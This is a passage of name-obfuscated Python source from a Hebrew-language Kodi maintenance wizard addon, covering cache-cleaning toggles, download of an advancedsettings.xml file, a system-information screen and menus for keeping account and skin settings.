	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0O0OOO0O000O0O0O .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2901
	if O0O0OOO0O000O0O0O =='true':#line:2902
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0OOOO00OO0O00OO0 [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00OOOO0O0O0O000 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OOOOOO0OOOOOO00 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OO000000000000OOO .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2906
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2907
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O000O00OOOO000 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	if OO0O000O00OOOO000 =='true':#line:2909
		addFile ('--- Include All Video Addons: %s'%OO0O00O0000O0000O .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Bob: %s'%O0000OO00OO000OOO .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Phoenix: %s'%OO0O0O00OOO0O0OO0 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Specto: %s'%O0O0OOOOOOO00O0OO .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include Exodus: %s'%OO00O0OO0OOOOO0OO .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Salts: %s'%OOO0O0O00O0OO000O .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Include Salts HD Lite: %s'%OO0OO0O0O00O0O0OO .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Include One Channel: %s'%O0O00OOO00O000OO0 .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2917
		addFile ('--- Include Genesis: %s'%OO0O0OO000OO00O0O .replace ('true',OOOO0O0OOOOOO00O0 ).replace ('false',OO00O000O00000OOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2918
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2920
	setView ('files','viewType')#line:2921
def advancedWindow (url =None ):#line:2923
	if not ADVANCEDFILE =='http://':#line:2924
		if url ==None :#line:2925
			OO0O00O00OOO00OO0 =wiz .workingURL (ADVANCEDFILE )#line:2926
			O0O0O000OOOO0OOO0 =uservar .ADVANCEDFILE #line:2927
		else :#line:2928
			OO0O00O00OOO00OO0 =wiz .workingURL (url )#line:2929
			O0O0O000OOOO0OOO0 =url #line:2930
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if os .path .exists (ADVANCED ):#line:2932
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2934
		if OO0O00O00OOO00OO0 ==True :#line:2935
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2936
			O0O00O0O00OOOO00O =wiz .openURL (O0O0O000OOOO0OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2937
			O00000O0O00OOOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O00O0O00OOOO00O )#line:2938
			if len (O00000O0O00OOOOO0 )>0 :#line:2939
				for O000O0OOO0OOO0OO0 ,O00OO0O0O0O000O0O ,url ,O00000OOOO0OOO00O ,O0O000000OO0OO00O ,OOOOOO0000O0O00OO in O00000O0O00OOOOO0 :#line:2940
					if O00OO0O0O0O000O0O .lower ()=="yes":#line:2941
						addDir ("[B]%s[/B]"%O000O0OOO0OOO0OO0 ,'advancedsetting',url ,description =OOOOOO0000O0O00OO ,icon =O00000OOOO0OOO00O ,fanart =O0O000000OO0OO00O ,themeit =THEME3 )#line:2942
					else :#line:2943
						addFile (O000O0OOO0OOO0OO0 ,'writeadvanced',O000O0OOO0OOO0OO0 ,url ,description =OOOOOO0000O0O00OO ,icon =O00000OOOO0OOO00O ,fanart =O0O000000OO0OO00O ,themeit =THEME2 )#line:2944
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2945
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0O00O00OOO00OO0 )#line:2946
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2947
def writeAdvanced (O00O0OOO0OO0O00O0 ,O0OO000OOOOOO0000 ):#line:2949
	OOOOOOOOOO00OOO0O =wiz .workingURL (O0OO000OOOOOO0000 )#line:2950
	if OOOOOOOOOO00OOO0O ==True :#line:2951
		if os .path .exists (ADVANCED ):O000O0O000O00000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOO0OO0O00O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2952
		else :O000O0O000O00000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00O0OOO0OO0O00O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2953
		if O000O0O000O00000O ==1 :#line:2955
			OOO000OO0OOOOOOO0 =wiz .openURL (O0OO000OOOOOO0000 )#line:2956
			O0O0OO0O00OO000O0 =open (ADVANCED ,'w');#line:2957
			O0O0OO0O00OO000O0 .write (OOO000OO0OOOOOOO0 )#line:2958
			O0O0OO0O00OO000O0 .close ()#line:2959
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2960
			wiz .killxbmc (True )#line:2961
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2962
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOOOOOOO00OOO0O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2963
def viewAdvanced ():#line:2965
	O0O000O000OO00O00 =open (ADVANCED )#line:2966
	O00O000OO00O0OOOO =O0O000O000OO00O00 .read ().replace ('\t','    ')#line:2967
	wiz .TextBox (ADDONTITLE ,O00O000OO00O0OOOO )#line:2968
	O0O000O000OO00O00 .close ()#line:2969
def removeAdvanced ():#line:2971
	if os .path .exists (ADVANCED ):#line:2972
		wiz .removeFile (ADVANCED )#line:2973
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2974
def showAutoAdvanced ():#line:2976
	notify .autoConfig ()#line:2977
def getIP ():#line:2979
	O00O0OO0OO0OO00O0 ='http://whatismyipaddress.com/'#line:2980
	if not wiz .workingURL (O00O0OO0OO0OO00O0 ):return 'Unknown','Unknown','Unknown'#line:2981
	O0000O0O0OO0O000O =wiz .openURL (O00O0OO0OO0OO00O0 ).replace ('\n','').replace ('\r','')#line:2982
	if not 'Access Denied'in O0000O0O0OO0O000O :#line:2983
		OOO000O0OO0O000O0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0000O0O0OO0O000O )#line:2984
		OOO0OOO000OO0O0OO =OOO000O0OO0O000O0 [0 ]if (len (OOO000O0OO0O000O0 )>0 )else 'Unknown'#line:2985
		OO0O0000O0O00000O =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0000O0O0OO0O000O )#line:2986
		OO0OOOO000O0OOOO0 =OO0O0000O0O00000O [0 ]if (len (OO0O0000O0O00000O )>0 )else 'Unknown'#line:2987
		OOO0O00O0O0O00OO0 =OO0O0000O0O00000O [1 ]+', '+OO0O0000O0O00000O [2 ]+', '+OO0O0000O0O00000O [3 ]if (len (OO0O0000O0O00000O )>2 )else 'Unknown'#line:2988
		return OOO0OOO000OO0O0OO ,OO0OOOO000O0OOOO0 ,OOO0O00O0O0O00OO0 #line:2989
	else :return 'Unknown','Unknown','Unknown'#line:2990
def systemInfo ():#line:2992
	O000OO000O0O000O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3006
	OOO00OOO0000OOO0O =[];O0000O000OO00OOO0 =0 #line:3007
	for OO0OO00000O0O000O in O000OO000O0O000O0 :#line:3008
		OOO0O00OO00O0OO0O =wiz .getInfo (OO0OO00000O0O000O )#line:3009
		O0O0O0O00OO0OOO0O =0 #line:3010
		while OOO0O00OO00O0OO0O =="Busy"and O0O0O0O00OO0OOO0O <10 :#line:3011
			OOO0O00OO00O0OO0O =wiz .getInfo (OO0OO00000O0O000O );O0O0O0O00OO0OOO0O +=1 ;wiz .log ("%s sleep %s"%(OO0OO00000O0O000O ,str (O0O0O0O00OO0OOO0O )));xbmc .sleep (1000 )#line:3012
		OOO00OOO0000OOO0O .append (OOO0O00OO00O0OO0O )#line:3013
		O0000O000OO00OOO0 +=1 #line:3014
	O0O0O0OO0000O0OO0 =OOO00OOO0000OOO0O [8 ]if 'Una'in OOO00OOO0000OOO0O [8 ]else wiz .convertSize (int (float (OOO00OOO0000OOO0O [8 ][:-8 ]))*1024 *1024 )#line:3015
	OOO0OO0OO0OO00OOO =OOO00OOO0000OOO0O [9 ]if 'Una'in OOO00OOO0000OOO0O [9 ]else wiz .convertSize (int (float (OOO00OOO0000OOO0O [9 ][:-8 ]))*1024 *1024 )#line:3016
	OO0000000OOO000O0 =OOO00OOO0000OOO0O [10 ]if 'Una'in OOO00OOO0000OOO0O [10 ]else wiz .convertSize (int (float (OOO00OOO0000OOO0O [10 ][:-8 ]))*1024 *1024 )#line:3017
	OOOOOO0OO00000O0O =wiz .convertSize (int (float (OOO00OOO0000OOO0O [11 ][:-2 ]))*1024 *1024 )#line:3018
	OOOOOO0OO00OO0OOO =wiz .convertSize (int (float (OOO00OOO0000OOO0O [12 ][:-2 ]))*1024 *1024 )#line:3019
	OO0OOO0OOOO0OOOO0 =wiz .convertSize (int (float (OOO00OOO0000OOO0O [13 ][:-2 ]))*1024 *1024 )#line:3020
	O000O000OOOO00OO0 ,O00O0O0O00OO0O0O0 ,OO00OO00000000000 =getIP ()#line:3021
	OOOOOO0OO0OO00OOO =[];OOO0OOOO0O0O00OOO =[];OO0OO00O00000O0O0 =[];OOO0OO0O000O0O0O0 =[];O00OOO00O00O00OOO =[];O000O0O0O0OO000O0 =[];OOOOO0OO000OO0O00 =[]#line:3023
	OO000000O0OO0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	for OO000OO0O0O00O0OO in sorted (OO000000O0OO0OO0O ,key =lambda O000000OOO0OO0OOO :O000000OOO0OO0OOO ):#line:3026
		O000O0000O0OO000O =os .path .split (OO000OO0O0O00O0OO [:-1 ])[1 ]#line:3027
		if O000O0000O0OO000O =='packages':continue #line:3028
		OOO0000OOO00O000O =os .path .join (OO000OO0O0O00O0OO ,'addon.xml')#line:3029
		if os .path .exists (OOO0000OOO00O000O ):#line:3030
			OO0O000O0OO000000 =open (OOO0000OOO00O000O )#line:3031
			O00000000O00OO000 =OO0O000O0OO000000 .read ()#line:3032
			OOO00O0OOO0O0OOO0 =re .compile ("<provides>(.+?)</provides>").findall (O00000000O00OO000 )#line:3033
			if len (OOO00O0OOO0O0OOO0 )==0 :#line:3034
				if O000O0000O0OO000O .startswith ('skin'):OOOOO0OO000OO0O00 .append (O000O0000O0OO000O )#line:3035
				if O000O0000O0OO000O .startswith ('repo'):O00OOO00O00O00OOO .append (O000O0000O0OO000O )#line:3036
				else :O000O0O0O0OO000O0 .append (O000O0000O0OO000O )#line:3037
			elif not (OOO00O0OOO0O0OOO0 [0 ]).find ('executable')==-1 :OOO0OO0O000O0O0O0 .append (O000O0000O0OO000O )#line:3038
			elif not (OOO00O0OOO0O0OOO0 [0 ]).find ('video')==-1 :OO0OO00O00000O0O0 .append (O000O0000O0OO000O )#line:3039
			elif not (OOO00O0OOO0O0OOO0 [0 ]).find ('audio')==-1 :OOO0OOOO0O0O00OOO .append (O000O0000O0OO000O )#line:3040
			elif not (OOO00O0OOO0O0OOO0 [0 ]).find ('image')==-1 :OOOOOO0OO0OO00OOO .append (O000O0000O0OO000O )#line:3041
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3046
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3047
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3048
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0OO0000O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0OO0OO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000000OOO000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO0OO00000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOO0OO00OO0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0OOOO0OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O000OOOO00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O0O00OO0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OO00000000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3068
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OOO0000OOO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	OO0000O00000OO0OO =len (OOOOOO0OO0OO00OOO )+len (OOO0OOOO0O0O00OOO )+len (OO0OO00O00000O0O0 )+len (OOO0OO0O000O0O0O0 )+len (O000O0O0O0OO000O0 )+len (OOOOO0OO000OO0O00 )+len (O00OOO00O00O00OOO )#line:3071
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OO0000O00000OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO00O00000O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OO0O000O0O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0OOOO0O0O00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO0OO0OO00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO00O00O00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3077
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0OO000OO0O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3078
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000O0O0O0OO000O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3079
def Menu ():#line:3080
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3081
def saveMenu ():#line:3083
	O0OO0OO0O0OOOOOO0 ='[COLOR yellow]מופעל[/COLOR]';OO0000OO0OO00OOO0 ='[COLOR blue]מבוטל[/COLOR]'#line:3085
	O00000000O00000OO ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3086
	OO00O000O00O00OOO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3087
	O000OOOO00O0OOOOO ='true'if KEEPINFO =='true'else 'false'#line:3088
	O00000OO0OO0O0OOO ='true'if KEEPSOUND =='true'else 'false'#line:3090
	O0O000O000OOO0000 ='true'if KEEPVIEW =='true'else 'false'#line:3091
	OOOOOOO0O0O0O0O0O ='true'if KEEPSKIN =='true'else 'false'#line:3092
	OO0O000OOOO0OOO0O ='true'if KEEPSKIN2 =='true'else 'false'#line:3093
	O0OO0OOO000O00OOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3094
	O0OO00000OO0OO000 ='true'if KEEPADDONS =='true'else 'false'#line:3095
	O00OO0O0OOOO00OOO ='true'if KEEPPVR =='true'else 'false'#line:3096
	O00OO0O000OO0O0OO ='true'if KEEPTVLIST =='true'else 'false'#line:3097
	O0O0OOOO0O0OO0O0O ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3098
	O0O00OO0OOOOO000O ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3099
	O00O00OO00OO00OOO ='true'if KEEPHUBTV =='true'else 'false'#line:3100
	OO00O0OOOOO0OOO00 ='true'if KEEPHUBVOD =='true'else 'false'#line:3101
	O00O000O0O000O000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3102
	OO00000OOOO0O0000 ='true'if KEEPHUBKIDS =='true'else 'false'#line:3103
	O0OOOO00OOOO000O0 ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3104
	OO0O0000000O0OOO0 ='true'if KEEPHUBMENU =='true'else 'false'#line:3105
	O0O00O0O00OOO0O0O ='true'if KEEPPLAYLIST =='true'else 'false'#line:3106
	OOOOOOO00OOOO000O ='true'if KEEPTRAKT =='true'else 'false'#line:3107
	O0OO0OOO0O0O0000O ='true'if KEEPREAL =='true'else 'false'#line:3108
	O0OO0000O0O0O0O00 ='true'if KEEPRD2 =='true'else 'false'#line:3109
	OOO00OO0O0000OOOO ='true'if KEEPTORNET =='true'else 'true'#line:3110
	O00OOOO000OO0OOOO ='true'if KEEPLOGIN =='true'else 'false'#line:3111
	OOOOO000O00OOO00O ='true'if KEEPSOURCES =='true'else 'false'#line:3112
	O00O00OOO0OO0O0O0 ='true'if KEEPADVANCED =='true'else 'false'#line:3113
	OO000O0O0OO00OO00 ='true'if KEEPPROFILES =='true'else 'false'#line:3114
	O000O000OO00OOOO0 ='true'if KEEPFAVS =='true'else 'false'#line:3115
	OO00000OOOO00O00O ='true'if KEEPREPOS =='true'else 'false'#line:3116
	OOO0000OO0OO000OO ='true'if KEEPSUPER =='true'else 'false'#line:3117
	OO00OO00OO0O00000 ='true'if KEEPWHITELIST =='true'else 'false'#line:3118
	OO0O0OO000OOOO0O0 ='true'if KEEPWEATHER =='true'else 'false'#line:3119
	O0000OOO0OO0000OO ='true'if KEEPVICTORY =='true'else 'false'#line:3120
	O0OOO0O00OO000OOO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3121
	if OO00OO00OO0O00000 =='true':#line:3123
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3125
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3126
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3127
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון RD:  '%O0OO0OOO0O0O0000O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת חשבון טראקט:  '%OOOOOOO00OOOO000O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת מועדפים:  '%O000O000OO00OOOO0 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00OO0O0OOOO00OOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0000OOO0OO0000OO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת חשבון טלמדיה:  '%O0OOO0O00OO000OOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O00OO0O000OO0O0OO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח סרטים:  '%O0O0OOOO0O0OO0O0O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח סדרות:  '%O0O00OO0OOOOO000O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח טלויזיה:  '%O00O00OO00OO00OOO .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח תוכן ישראלי:  '%OO00O0OOOOO0OOO00 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת אריח ספורט:  '%O00O000O0O000O000 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת אריח ילדים:  '%OO00000OOOO0O0000 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת אריח מוסיקה:  '%O0OOOO00OOOO000O0 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OO0O0000000O0OOO0 .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3147
	addFile ('%s שמירת כל האריחים בסקין:  '%OOOOOOO0O0O0O0O0O .replace ('true',O0OO0OO0O0OOOOOO0 ).replace ('false',OO0000OO0OO00OOO0 ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3148
